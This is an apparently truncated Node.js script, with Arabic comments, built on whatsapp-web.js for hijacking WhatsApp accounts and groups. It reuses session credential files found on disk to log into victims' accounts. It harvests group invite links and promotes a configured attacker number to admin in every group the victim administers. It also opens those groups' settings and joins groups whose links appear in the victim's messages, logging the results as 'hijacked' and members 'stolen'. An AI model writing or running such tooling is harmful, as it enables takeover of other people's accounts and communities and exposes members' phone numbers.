const { Client, LocalAuth } = require('whatsapp-web.js');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const config = require('./config.json');

// ============================================
// إعدادات
// ============================================
const SESSION_DIR = './sessions';
const LOG_FILE = './hijack_results.log';
const ATTACKER_NUMBER = config.attacker_number;

// تأكد من وجود المجلدات
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });

// ============================================
// نظام تسجيل
// ============================================
function log(msg, data = null) {
    const ts = new Date().toISOString();
    const line = `[${ts}] ${msg}${data ? ' | ' + JSON.stringify(data) : ''}`;
    console.log(line);
    fs.appendFileSync(LOG_FILE, line + '\n');
}

// ============================================
// البحث عن ملفات الجلسات
// ============================================
function findSessionFiles() {
    const sessions = [];
    const walkDir = (dir) => {
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                if (fs.existsSync(path.join(fullPath, 'creds.json')) ||
                    fs.existsSync(path.join(fullPath, 'session.json'))) {
                    sessions.push(fullPath);
                }
                walkDir(fullPath);
            }
        }
    };
    
    if (fs.existsSync(SESSION_DIR)) walkDir(SESSION_DIR);
    return sessions;
}

// ============================================
// محاولة كل جلسة
// ============================================
async function trySession(sessionPath) {
    return new Promise((resolve) => {
        log(`[+] محاولة استخدام الجلسة: ${sessionPath}`);
        
        const client = new Client({
            authStrategy: new LocalAuth({
                dataPath: sessionPath
            }),
            puppeteer: {
                headless: true,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--no-first-run'
                ],
                timeout: 30000
            }
        });
        
        let timeout = setTimeout(() => {
            log(`[-] انتهاء مهلة الجلسة: ${sessionPath}`);
            client.destroy();
            resolve(null);
        }, 45000);
        
        client.on('ready', async () => {
            clearTimeout(timeout);
            log(`✅ الجلسة صالحة: ${sessionPath}`);
            
            try {
                const result = await analyzeAndHijack(client, sessionPath);
                resolve(result);
            } catch (e) {
                log(`❌ خطأ أثناء الاختراق: ${e.message}`);
                resolve(null);
            }
            
            client.destroy();
        });
        
        client.on('auth_failure', (msg) => {
            clearTimeout(timeout);
            log(`❌ فشل مصادقة الجلسة: ${msg}`);
            resolve(null);
        });
        
        client.on('disconnected', (reason) => {
            clearTimeout(timeout);
            log(`❌ قطع الاتصال: ${reason}`);
            resolve(null);
        });
        
        client.initialize();
    });
}

// ============================================
// تحليل المجموعات والاختراق
// ============================================
async function analyzeAndHijack(client, sessionPath) {
    const results = {
        session: sessionPath,
        owner: null,
        groups_accessible: 0,
        groups_admin: 0,
        groups_hijacked: 0,
        members_stolen: 0,
        invite_links: []
    };
    
    // 1. جلب معلومات الحساب
    const info = await client.info;
    results.owner = {
        number: info.wid.user,
        name: info.pushname || info.me.name || 'Unknown',
        platform: info.platform
    };
    log(`👤 حساب: ${results.owner.number} - ${results.owner.name}`);
    
    // 2. جلب كل المجموعات
    const chats = await client.getChats();
    const groups = chats.filter(c => c.isGroup);
    results.groups_accessible = groups.length;
    
    log(`📋 مجموعات متاحة: ${groups.length}`);
    
    const hijackTargets = [];
    
    for (const group of groups) {
        const participants = group.participants;
        const admins = participants.filter(p => p.isAdmin);
        const isAdmin = admins.some(a => a.id._serialized === `${results.owner.number}@c.us`);
        
        log(`   📁 ${group.name} | أعضاء: ${participants.length} | مشرفين: ${admins.length} | أنا مشرف: ${isAdmin}`);
        
        const groupInfo = {
            id: group.id._serialized,
            name: group.name,
            memberCount: participants.length,
            admins: admins.map(a => a.id.user),
            iAmAdmin: isAdmin,
            inviteCode: null
        };
        
        // 3. استخراج رابط الدعوة
        try {
            groupInfo.inviteCode = await group.getInviteCode();
            results.invite_links.push({
                group: group.name,
                link: `https://chat.whatsapp.com/${groupInfo.inviteCode}`
            });
            log(`      🔗 رابط: https://chat.whatsapp.com/${groupInfo.inviteCode}`);
        } catch (e) {
            log(`      ❌ لا يمكن الحصول على رابط`);
        }
        
        // 4. إذا أنا مشرف → أضيف المهاجم
        if (isAdmin) {
            results.groups_admin++;
            hijackTargets.push(group);
        }
    }
    
    // 5. تنفيذ الاختراق (رفع المهاجم)
    log(`\n🚀 بدء اختراق ${hijackTargets.length} مجموعة...`);
    
    for (const target of hijackTargets) {
        try {
            log(`⬆️ محاولة رفع ${ATTACKER_NUMBER} في "${target.name}"...`);
            
            // رفع الرقم المستهدف كأدمن
            await target.promoteParticipants([ATTACKER_NUMBER]);
            
            log(`✅ تم رفع ${ATTACKER_NUMBER} كأدمن في "${target.name}"`);
            results.groups_hijacked++;
            
            // تغيير إعدادات المجموعة
            try {
                await target.setMessagesAdminsOnly(false);
                log(`   📢 تم فتح إرسال الرسائل للكل`);
            } catch (e) {}
            
            try {
                await target.setInfoAdminsOnly(false);
                log(`   ℹ️ تم فتح تعديل معلومات المجموعة`);
            } catch (e) {}
            
            // سحب أرقام الأعضاء
            target.participants.forEach(p => {
                results.members_stolen++;
            });
            
        } catch (e) {
            log(`❌ فشل في "${target.name}": ${e.message}`);
        }
    }
    
    // 6. محاولة الانضمام لمجموعات إضافية عبر روابط ثابتة
    log(`\n🔍 البحث عن روابط مجموعات في الرسائل...`);
    try {
        const messages = await client.getMessages();
        for (const msg of messages) {
            const text = msg.body || '';
            const links = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/g);
            if (links) {
                for (const link of links) {
                    try {
                        const groupId = await client.acceptInvite(link);
                        const newGroup = await client.getChatById(groupId);
                        log(`✅ انضممت لمجموعة جديدة: ${newGroup.name}`);
                        
                        // محاولة رفع المهاجم
                        await newGroup.promoteParticipants([ATTACKER_NUMBER]);
                        log(`✅ رفعت المهاجم في "${newGroup.name}"`);
                        results.groups_hijacked++;
                    } catch (e) {}
                }
            }
        }
    } catch (e) {}
    
    return results;
}

// ============================================
// عرض التقرير النهائي
// ============================================
function displayReport(results) {
    console.log('\n' + '='.repeat(60));
    console.log('📊 تقرير اختبار الاختراق');
    console.log('='.repeat(60));
    
    results.forEach((r, i) => {
        if (!r) return;
        console.log(`\n--- الجلسة ${i + 1} ---`);
        console.log(`👤 حساب: ${r.owner.number} (${r.owner.name})`);
        console.log(`📋 مجموعات متاحة: ${r.groups_accessible}`);
        console.log(`👑 مجموعات أنا مشرف فيها: ${r.groups_admin}`);
        console.log(`✅ مجموعات تم اختراقها: ${r.groups_hijacked}`);
        console.log(`👥 أعضاء تم سحبهم: ${r.members_stolen}`);
        
        if (r.invite_links.length > 0) {
            console.log(`\n🔗 روابط المجموعات المسربة:`);
            r.invite_links.forEach(l => console.log(`   ${l.group}: ${l.link}`));
        }
    });
    
    console.log('\n' + '='.repeat(60));
    console.log('✅ تم حفظ النتائج في: ' + LOG_FILE);
    console.log('='.repeat(60));
}

// ============================================
// الرئيسية